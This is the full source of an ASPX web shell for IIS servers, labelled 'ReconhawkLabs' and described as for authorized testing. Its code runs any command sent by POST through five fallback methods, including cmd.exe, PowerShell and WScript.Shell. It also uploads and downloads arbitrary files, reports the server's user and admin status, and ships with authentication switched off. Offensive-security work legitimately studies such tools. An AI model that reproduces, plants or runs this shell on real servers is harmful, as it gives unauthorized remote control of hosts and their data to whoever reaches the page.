<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Security.Principal" %>

<script runat="server">
/**
 * Multi-Method ASPX Webshell - For IIS Servers
 * For authorized security testing only
 * Features: Multiple execution methods, file operations, chunked uploads
 * Auto-detects permissions and uses appropriate execution methods
 */

// Configuration
private const bool AUTH_ENABLED = false;
private const string AUTH_PASSWORD = "changeme";

protected void Page_Load(object sender, EventArgs e)
{
    // Set response for better performance
    Response.Buffer = true;

    // Authentication check
    if (AUTH_ENABLED && Request.Form["password"] != AUTH_PASSWORD)
    {
        if (Request.HttpMethod == "POST")
        {
            Response.StatusCode = 401;
            Response.ContentType = "application/json";
            Response.Write("{\"error\":\"Authentication failed\"}");
            Response.End();
            return;
        }
    }

    // Handle chunked upload
    if (Request.Form["chunk_data"] != null)
    {
        HandleChunkedUpload();
        return;
    }

    // Handle file download
    if (Request.QueryString["download"] != null)
    {
        HandleDownload();
        return;
    }

    // Handle file upload
    if (Request.Files.Count > 0 && Request.Files["upload_file"] != null)
    {
        HandleUpload();
        return;
    }

    // Handle command execution (API mode)
    if (Request.HttpMethod == "POST" && Request.Form["cmd"] != null)
    {
        HandleCommandAPI();
        return;
    }

    // Otherwise render the UI
    RenderUI();
}

private void HandleChunkedUpload()
{
    try
    {
        string chunkData = Request.Form["chunk_data"];
        string filename = Request.Form["chunk_filename"];
        int chunkIndex = int.Parse(Request.Form["chunk_index"]);
        bool isLast = Request.Form["chunk_last"] == "true";
        string uploadDir = Request.Form["upload_dir"] ?? Server.MapPath(".");

        string targetFile = Path.Combine(uploadDir, Path.GetFileName(filename));

        // Ensure directory exists
        if (!Directory.Exists(uploadDir))
        {
            Directory.CreateDirectory(uploadDir);
        }

        // Decode and write chunk
        byte[] bytes = Convert.FromBase64String(chunkData);
        FileMode mode = chunkIndex == 0 ? FileMode.Create : FileMode.Append;

        using (FileStream fs = new FileStream(targetFile, mode, FileAccess.Write))
        {
            fs.Write(bytes, 0, bytes.Length);
        }

        Response.ContentType = "application/json";
        if (isLast)
        {
            FileInfo fi = new FileInfo(targetFile);
            Response.Write(string.Format("{{\"success\":true,\"message\":\"File uploaded successfully (chunked)\",\"path\":\"{0}\",\"size\":{1},\"chunks\":{2}}}",
                targetFile.Replace("\\", "\\\\"), fi.Length, chunkIndex + 1));
        }
        else
        {
            Response.Write(string.Format("{{\"success\":true,\"message\":\"Chunk received\",\"chunk\":{0}}}", chunkIndex));
        }
    }
    catch (Exception ex)
    {
        Response.ContentType = "application/json";
        Response.Write(string.Format("{{\"success\":false,\"message\":\"Chunk upload failed: {0}\"}}",
            ex.Message.Replace("\"", "\\\"")));
    }
    Response.End();
}

private void HandleDownload()
{
    try
    {
        string file = Request.QueryString["download"];
        if (File.Exists(file))
        {
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(file) + "\"");
            Response.TransmitFile(file);
            Response.End();
        }
        else
        {
            Response.Write("File not found or not readable");
        }
    }
    catch (Exception ex)
    {
        Response.Write("Download error: " + ex.Message);
    }
}

private void HandleUpload()
{
    List<string> errorDetails = new List<string>();
    bool uploadSuccess = false;
    string methodUsed = "";
    string targetFile = "";

    try
    {
        HttpPostedFile file = Request.Files["upload_file"];
        string uploadDir = Request.Form["upload_dir"] ?? Server.MapPath(".");
        targetFile = Path.Combine(uploadDir, Path.GetFileName(file.FileName));

        // Check and create directory
        if (!Directory.Exists(uploadDir))
        {
            try
            {
                Directory.CreateDirectory(uploadDir);
                errorDetails.Add("Created directory: " + uploadDir);
            }
            catch (Exception ex)
            {
                errorDetails.Add("Failed to create directory: " + ex.Message);
            }
        }

        // Method 1: SaveAs (standard method)
        try
        {
            file.SaveAs(targetFile);
            uploadSuccess = true;
            methodUsed = "SaveAs";
        }
        catch (Exception ex)
        {
            errorDetails.Add("SaveAs failed: " + ex.Message);
        }

        // Method 2: Stream copy
        if (!uploadSuccess)
        {
            try
            {
                using (FileStream fs = new FileStream(targetFile, FileMode.Create))
                {
                    file.InputStream.CopyTo(fs);
                }
                uploadSuccess = true;
                methodUsed = "Stream.CopyTo";
            }
            catch (Exception ex)
            {
                errorDetails.Add("Stream copy failed: " + ex.Message);
            }
        }

        // Method 3: BinaryReader/Writer
        if (!uploadSuccess)
        {
            try
            {
                using (BinaryReader br = new BinaryReader(file.InputStream))
                {
                    byte[] bytes = br.ReadBytes(file.ContentLength);
                    using (BinaryWriter bw = new BinaryWriter(File.Open(targetFile, FileMode.Create)))
                    {
                        bw.Write(bytes);
                    }
                }
                uploadSuccess = true;
                methodUsed = "BinaryReader/Writer";
            }
            catch (Exception ex)
            {
                errorDetails.Add("BinaryReader/Writer failed: " + ex.Message);
            }
        }

        // Method 4: File.WriteAllBytes
        if (!uploadSuccess)
        {
            try
            {
                byte[] bytes = new byte[file.ContentLength];
                file.InputStream.Read(bytes, 0, file.ContentLength);
                File.WriteAllBytes(targetFile, bytes);
                uploadSuccess = true;
                methodUsed = "File.WriteAllBytes";
            }
            catch (Exception ex)
            {
                errorDetails.Add("WriteAllBytes failed: " + ex.Message);
            }
        }

        Response.ContentType = "application/json";
        if (uploadSuccess && File.Exists(targetFile))
        {
            FileInfo fi = new FileInfo(targetFile);
            Response.Write(string.Format("{{\"success\":true,\"message\":\"File uploaded successfully\",\"path\":\"{0}\",\"method\":\"{1}\",\"size\":{2}}}",
                targetFile.Replace("\\", "\\\\"), methodUsed, fi.Length));
        }
        else
        {
            Response.Write(string.Format("{{\"success\":false,\"message\":\"Upload failed\",\"errors\":[\"{0}\"]}}",
                string.Join("\",\"", errorDetails).Replace("\"", "\\\"")));
        }
    }
    catch (Exception ex)
    {
        Response.ContentType = "application/json";
        Response.Write(string.Format("{{\"success\":false,\"message\":\"Upload exception: {0}\"}}",
            ex.Message.Replace("\"", "\\\"")));
    }
    Response.End();
}

private Dictionary<string, object> ExecuteCommand(string cmd)
{
    string output = "";
    string method = "none";

    // Method 1: cmd.exe with Process (most reliable)
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        using (Process process = Process.Start(psi))
        {
            output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
            process.WaitForExit(30000); // 30 second timeout
        }

        if (!string.IsNullOrEmpty(output))
        {
            method = "cmd.exe/Process";
            return new Dictionary<string, object> { { "output", output }, { "method", method } };
        }
    }
    catch { }

    // Method 2: PowerShell with Process
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-NoProfile -NonInteractive -Command \"" + cmd.Replace("\"", "`\"") + "\"";
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        using (Process process = Process.Start(psi))
        {
            output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
            process.WaitForExit(30000);
        }

        if (!string.IsNullOrEmpty(output))
        {
            method = "PowerShell/Process";
            return new Dictionary<string, object> { { "output", output }, { "method", method } };
        }
    }
    catch { }

    // Method 3: Direct Process.Start without cmd.exe wrapper
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        string[] parts = cmd.Split(new[] { ' ' }, 2);
        psi.FileName = parts[0];
        if (parts.Length > 1) psi.Arguments = parts[1];
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        using (Process process = Process.Start(psi))
        {
            output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
            process.WaitForExit(30000);
        }

        if (!string.IsNullOrEmpty(output))
        {
            method = "Direct/Process";
            return new Dictionary<string, object> { { "output", output }, { "method", method } };
        }
    }
    catch { }

    // Method 4: Shell Execute with redirect
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = Environment.GetEnvironmentVariable("COMSPEC") ?? "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;

        using (Process process = Process.Start(psi))
        {
            output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
            process.WaitForExit(30000);
        }

        if (!string.IsNullOrEmpty(output))
        {
            method = "COMSPEC/Process";
            return new Dictionary<string, object> { { "output", output }, { "method", method } };
        }
    }
    catch { }

    // Method 5: WScript.Shell COM object (alternative method)
    try
    {
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        if (shellType != null)
        {
            object shell = Activator.CreateInstance(shellType);
            object exec = shellType.InvokeMember("Exec", System.Reflection.BindingFlags.InvokeMethod, null, shell, new object[] { "cmd.exe /c " + cmd });

            Type execType = exec.GetType();
            object stdout = execType.InvokeMember("StdOut", System.Reflection.BindingFlags.GetProperty, null, exec, null);
            Type stdoutType = stdout.GetType();

            output = (string)stdoutType.InvokeMember("ReadAll", System.Reflection.BindingFlags.InvokeMethod, null, stdout, null);

            if (!string.IsNullOrEmpty(output))
            {
                method = "WScript.Shell/COM";
                return new Dictionary<string, object> { { "output", output }, { "method", method } };
            }
        }
    }
    catch { }

    return new Dictionary<string, object> { { "output", "All execution methods failed or are disabled" }, { "method", "none" } };
}

private void HandleCommandAPI()
{
    try
    {
        string cmd = Request.Form["cmd"];
        Dictionary<string, object> result = ExecuteCommand(cmd);

        Response.ContentType = "application/json";
        Response.Write(string.Format("{{\"command\":\"{0}\",\"output\":\"{1}\",\"method\":\"{2}\",\"cwd\":\"{3}\",\"timestamp\":\"{4}\"}}",
            cmd.Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", ""),
            result["output"].ToString().Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", ""),
            result["method"],
            Server.MapPath(".").Replace("\\", "\\\\"),
            DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")));
    }
    catch (Exception ex)
    {
        Response.ContentType = "application/json";
        Response.Write(string.Format("{{\"error\":\"{0}\"}}", ex.Message.Replace("\"", "\\\"")));
    }
    Response.End();
}

private Dictionary<string, string> GetSystemInfo()
{
    Dictionary<string, string> info = new Dictionary<string, string>();

    try { info["hostname"] = Environment.MachineName; } catch { info["hostname"] = "Unknown"; }
    try { info["os"] = Environment.OSVersion.ToString(); } catch { info["os"] = "Unknown"; }
    try { info["framework"] = Environment.Version.ToString(); } catch { info["framework"] = "Unknown"; }
    try { info["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"]; } catch { info["server_software"] = "Unknown"; }
    try { info["current_user"] = WindowsIdentity.GetCurrent().Name; } catch { info["current_user"] = "Unknown"; }
    try { info["cwd"] = Server.MapPath("."); } catch { info["cwd"] = "Unknown"; }
    try { info["app_path"] = Request.PhysicalApplicationPath; } catch { info["app_path"] = "Unknown"; }
    try { info["is_admin"] = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString(); } catch { info["is_admin"] = "Unknown"; }

    return info;
}

private void RenderUI()
{
    Dictionary<string, string> sysinfo = GetSystemInfo();

    Response.Write(@"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>ReconhawkLabs ASPX Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; font-size: 13px; }
        .container { max-width: 1600px; margin: 0 auto; }
        h1 { color: #00ff00; margin-bottom: 8px; font-size: 18px; letter-spacing: 1px; }
        .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 10px; padding: 8px; background: #000; border: 1px solid #00ff00; font-size: 11px; }
        .info-item { display: flex; gap: 10px; }
        .info-label { color: #ffffff; font-weight: bold; }
        .terminal-section { margin-bottom: 10px; }
        .section-title { color: #ffffff; margin-bottom: 5px; font-size: 14px; text-transform: uppercase; }
        .terminal { background: #000; border: 1px solid #00ff00; padding: 10px; height: 250px; overflow-y: auto; margin-bottom: 5px; font-size: 12px; }
        .terminal-output { white-space: pre-wrap; word-wrap: break-word; margin-bottom: 5px; }
        .command-line { color: #ffaa00; }
        .method-info { color: #888; font-size: 0.85em; }
        .input-group { display: flex; gap: 5px; margin-bottom: 10px; }
        input[type=""text""] { flex: 1; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 6px 10px; font-family: 'Courier New', monospace; font-size: 13px; }
        input[type=""text""]:focus { outline: none; border: 1px solid #ffffff; }
        button, .btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px 15px; font-family: 'Courier New', monospace; font-weight: bold; cursor: pointer; font-size: 13px; }
        button:hover, .btn:hover { background: #00ff00; color: #000; }
        .file-operations { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px; }
        .file-op-box { background: #000; border: 1px solid #00ff00; padding: 10px; }
        input[type=""file""] { display: block; margin: 5px 0; color: #00ff00; font-size: 12px; }
        .status-message { padding: 5px; margin: 5px 0; display: none; font-size: 12px; }
        .status-success { background: #000; border: 1px solid #00ff00; color: #00ff00; }
        .status-error { background: #000; border: 1px solid #ff0000; color: #ff0000; }
        .api-example { background: #000; padding: 5px; margin: 5px 0; overflow-x: auto; border-left: 2px solid #00ff00; padding-left: 10px; }
        .api-example code { color: #ffaa00; font-size: 11px; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>
    <div class=""container"">
        <h1>[ ReconhawkLabs ] - ASPX Multi-Method Shell</h1>

        <div class=""info-grid"">
            <div class=""info-item""><span class=""info-label"">Hostname:</span><span>" + HttpUtility.HtmlEncode(sysinfo["hostname"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">OS:</span><span>" + HttpUtility.HtmlEncode(sysinfo["os"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">Framework:</span><span>.NET " + HttpUtility.HtmlEncode(sysinfo["framework"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">User:</span><span>" + HttpUtility.HtmlEncode(sysinfo["current_user"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">CWD:</span><span>" + HttpUtility.HtmlEncode(sysinfo["cwd"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">Server:</span><span>" + HttpUtility.HtmlEncode(sysinfo["server_software"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">Admin:</span><span>" + HttpUtility.HtmlEncode(sysinfo["is_admin"]) + @"</span></div>
            <div class=""info-item""><span class=""info-label"">Auto-Chunking:</span><span style=""color: #00ff00;"">Enabled (>1.5MB)</span></div>
        </div>

        <div class=""terminal-section"">
            <h2 class=""section-title"">[ Command Terminal ]</h2>
            <div id=""terminal"" class=""terminal""></div>
            <div class=""input-group"">
                <input type=""text"" id=""cmdInput"" placeholder=""Enter command..."" autofocus>
                <button onclick=""executeCmd()"">Execute</button>
                <button onclick=""clearTerminal()"">Clear</button>
            </div>
        </div>

        <div class=""file-operations"">
            <div class=""file-op-box"">
                <h2 class=""section-title"">[ Upload File ]</h2>
                <form id=""uploadForm"" enctype=""multipart/form-data"">
                    <input type=""file"" name=""upload_file"" id=""uploadFile"" required>
                    <input type=""text"" name=""upload_dir"" placeholder=""Upload directory (default: current)"" style=""width: 100%; margin: 5px 0;"">
                    <input type=""hidden"" name=""ajax"" value=""1"">
                    <button type=""submit"">Upload</button>
                </form>
                <div id=""uploadStatus"" class=""status-message""></div>
            </div>

            <div class=""file-op-box"">
                <h2 class=""section-title"">[ Download File ]</h2>
                <input type=""text"" id=""downloadPath"" placeholder=""Enter file path..."" style=""width: 100%; margin: 5px 0;"">
                <button onclick=""downloadFile()"">Download</button>
                <div id=""downloadStatus"" class=""status-message""></div>
            </div>

            <div class=""file-op-box"">
                <h2 class=""section-title"">[ API Documentation ]</h2>
                <p>POST command:</p>
                <div class=""api-example""><code>curl -X POST [URL] -d ""cmd=whoami""</code></div>
                <p style=""margin-top: 5px;"">Returns: JSON (output, method, cwd, timestamp)</p>
            </div>
        </div>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const cmdInput = document.getElementById('cmdInput');
        let commandHistory = [];
        let historyIndex = -1;

        cmdInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                executeCmd();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    cmdInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    cmdInput.value = commandHistory[historyIndex];
                } else if (historyIndex === 0) {
                    historyIndex = -1;
                    cmdInput.value = '';
                }
            }
        });

        async function executeCmd() {
            const cmd = cmdInput.value.trim();
            if (!cmd) return;

            commandHistory.unshift(cmd);
            historyIndex = -1;

            const cmdLine = document.createElement('div');
            cmdLine.className = 'command-line';
            cmdLine.textContent = '> ' + cmd;
            terminal.appendChild(cmdLine);

            cmdInput.value = '';

            try {
                const formData = new FormData();
                formData.append('cmd', cmd);

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                const output = document.createElement('div');
                output.className = 'terminal-output';
                output.textContent = result.output || '(no output)';
                terminal.appendChild(output);

                const methodInfo = document.createElement('div');
                methodInfo.className = 'method-info';
                methodInfo.textContent = `[Method: ${result.method}] [CWD: ${result.cwd}]`;
                terminal.appendChild(methodInfo);

            } catch (error) {
                const errorDiv = document.createElement('div');
                errorDiv.style.color = '#ff0000';
                errorDiv.textContent = 'Error: ' + error.message;
                terminal.appendChild(errorDiv);
            }

            terminal.scrollTop = terminal.scrollHeight;
        }

        function clearTerminal() {
            terminal.innerHTML = '';
        }

        async function uploadInChunks(file, uploadDir) {
            const CHUNK_SIZE = 1024 * 1024;
            const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
            const statusDiv = document.getElementById('uploadStatus');

            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `Uploading in chunks (${totalChunks} chunks)...`;
            statusDiv.style.display = 'block';

            for (let i = 0; i < totalChunks; i++) {
                const start = i * CHUNK_SIZE;
                const end = Math.min(start + CHUNK_SIZE, file.size);
                const chunk = file.slice(start, end);

                const reader = new FileReader();
                const chunkData = await new Promise((resolve, reject) => {
                    reader.onload = (e) => resolve(e.target.result.split(',')[1]);
                    reader.onerror = reject;
                    reader.readAsDataURL(chunk);
                });

                const formData = new FormData();
                formData.append('chunk_data', chunkData);
                formData.append('chunk_filename', file.name);
                formData.append('chunk_index', i);
                formData.append('chunk_last', i === totalChunks - 1 ? 'true' : 'false');
                if (uploadDir) formData.append('upload_dir', uploadDir);

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (!result.success) {
                    throw new Error(`Chunk ${i} failed: ${result.message}`);
                }

                statusDiv.textContent = `Uploading: ${Math.round((i + 1) / totalChunks * 100)}%`;
            }

            return { success: true, message: 'File uploaded successfully (chunked)' };
        }

        document.getElementById('uploadForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = new FormData(this);
            const statusDiv = document.getElementById('uploadStatus');
            const fileInput = document.getElementById('uploadFile');
            const file = fileInput.files[0];
            const uploadDir = formData.get('upload_dir');

            const maxSize = 1.5 * 1024 * 1024;

            try {
                if (file.size > maxSize) {
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = `File size: ${(file.size / 1024 / 1024).toFixed(2)}MB - using chunked upload...`;
                    statusDiv.style.display = 'block';

                    const result = await uploadInChunks(file, uploadDir);

                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = result.message;
                    document.getElementById('uploadFile').value = '';
                    setTimeout(() => statusDiv.style.display = 'none', 5000);
                } else {
                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    statusDiv.className = 'status-message ' + (result.success ? 'status-success' : 'status-error');
                    statusDiv.textContent = result.message + (result.path ? ' (' + result.path + ')' : '');

                    if (!result.success && result.errors) {
                        statusDiv.textContent += '\\nErrors: ' + result.errors.join('; ');
                    }

                    statusDiv.style.display = 'block';

                    if (result.success) {
                        document.getElementById('uploadFile').value = '';
                        setTimeout(() => statusDiv.style.display = 'none', 5000);
                    }
                }
            } catch (error) {
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Upload error: ' + error.message;
                statusDiv.style.display = 'block';
            }
        });

        function downloadFile() {
            const path = document.getElementById('downloadPath').value.trim();
            const statusDiv = document.getElementById('downloadStatus');

            if (!path) {
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Please enter a file path';
                statusDiv.style.display = 'block';
                setTimeout(() => statusDiv.style.display = 'none', 3000);
                return;
            }

            window.location.href = window.location.pathname + '?download=' + encodeURIComponent(path);
        }

        cmdInput.focus();
    </script>
</body>
</html>");
}
</script>
